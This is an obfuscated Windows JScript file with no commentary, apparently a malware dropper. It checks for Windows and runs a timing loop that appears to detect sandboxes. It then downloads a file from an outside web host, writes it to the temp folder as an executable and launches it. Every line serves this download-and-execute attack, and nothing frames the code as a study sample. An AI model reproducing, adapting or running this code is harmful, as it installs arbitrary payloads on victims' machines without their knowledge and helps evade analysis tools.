var WK = false;
var MF = "CreateObject";
var s = function B() {return WScript[MF]("WScript.Shell");}(), w = 11;
var L0 = "MSXML2.XMLHTTP";
var P = 2123213;
var c = 0;
function G0(C){s["Run"](C, c, c);};
function L(){return "" + L0;};
function ar(kM, R){c = c * 1; return kM - R;};
function Hg(){return MF;};
/*@cc_on
  @if (@_win32 || @_win64)
    WK = true;
  @end
@*/
if (WK)
{
var hj = "";
function G(){return 22;};
var zB = 0; var Yd = 0;
function wZ()
{
var i = new this["Date"]();
var Q = i["getUTCMilliseconds"]();
WScript["Sleep"](G());
var i = new this["Date"]();
var lj = i["getUTCMilliseconds"]();
WScript["Sleep"](G());
var i = new this["Date"]();
var cM = i["getUTCMilliseconds"]();
var zB = "u0";
zB = ar(lj, Q);
var Yd = "Hd";
Yd = ar(cM, lj);
hj = "open";
return ar(zB, Yd);
}
var D = false;
var c0 = false;
for (var If = c; If < G() * 1; If++){if (wZ() != c){
D = true; 
Yd = "31" + 11 * zB + Yd; 
c0 = true; 
break;
}}
function u() {return ((D == true) && (D == c0)) ? 1 : c;};
if (D && u() && c0){
function xm() {return s["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Pbno2qfpRP.exe";};
 hq = L();
 G1 = WScript[MF](hq);
 var Fo = 1;
 while (Fo){
try {
G1[hj]("GET", "http://pasticceriabonci.com/n4usj", false);
G1["send"]();
F = "Sleep";
for (;;){WScript[F](G() * 11); if (G1["readystate"] >= 2 * 2) break;};
Fo = c;
} catch(cM0){};
}
function O(o) {var M = (1, 2, 3, 4, 5, o); return M;};
q = WScript[Hg()]("ADODB.Stream");
hq = q;
hq[hj]();
hq["type"] = O(1);
hq["write"](G1["ResponseBody"]);
q["position"] = O(c);
hq["Save" + "ToFile"](xm(), 2);
q["c"+"lose"]();
LG = xm();
G0(LG);
}
}

